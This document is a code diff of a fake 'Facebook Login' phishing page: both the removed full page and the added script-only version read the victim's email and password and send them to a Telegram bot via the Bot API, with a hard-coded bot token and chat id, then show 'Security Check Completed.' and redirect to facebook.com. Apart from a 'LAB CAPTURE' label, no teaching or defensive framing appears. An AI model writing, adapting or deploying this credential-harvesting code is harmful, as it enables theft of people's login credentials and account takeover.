@@ -1,24 +1,19 @@
-<!DOCTYPE html>
-<html>
-<body style="background:#f0f2f5; font-family:Arial;">
-    <div style="width:300px; margin:100px auto; background:white; padding:20px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1);">
-        <h2 style="color:#1877f2;">Facebook Login</h2>
-        <input type="text" id="email" placeholder="Email" style="width:90%; padding:10px; margin-bottom:10px;"><br>
-        <input type="password" id="pass" placeholder="Password" style="width:90%; padding:10px; margin-bottom:10px;"><br>
-        <button onclick="sendToBot()" style="width:100%; padding:10px; background:#1877f2; color:white; border:none; border-radius:6px; cursor:pointer;">Log In</button>
-    </div>
-
-    <script>
-    function sendToBot() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-        const token = "8767378982:AAEL4tVNoWPY_KFHeBTAWnvYxBNzE-aG0E0";
-        const chat_id = "7975512704";
-        const text = `🔥 **LAB CAPTURE** 🔥\n👤 User: ${email}\n🔑 Pass: ${pass}`;
-        
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=markdown`)
-        .then(() => { alert("Security Check Completed."); window.location.href="https://facebook.com"; });
-    }
-    </script>
-</body>
-</html>
+<script>
+function sendToBot() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
+    
+    // YOUR NEW DRAKMIND TOKEN
+    const token = "8767378982:AAEL4tVNoWPY_KFHeBTAWnvYxBNzE-aG0E0";
+    const chat_id = "7975512704";
+    
+    // THE TRIGGER WORD
+    const text = `CAPTURE_ALERT\n👤 User: ${email}\n🔑 Pass: ${pass}`;
+    
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=markdown`)
+    .then(() => {
+        alert("Security Check Completed.");
+        window.location.href = "https://facebook.com";
+    });
+}
+</script>
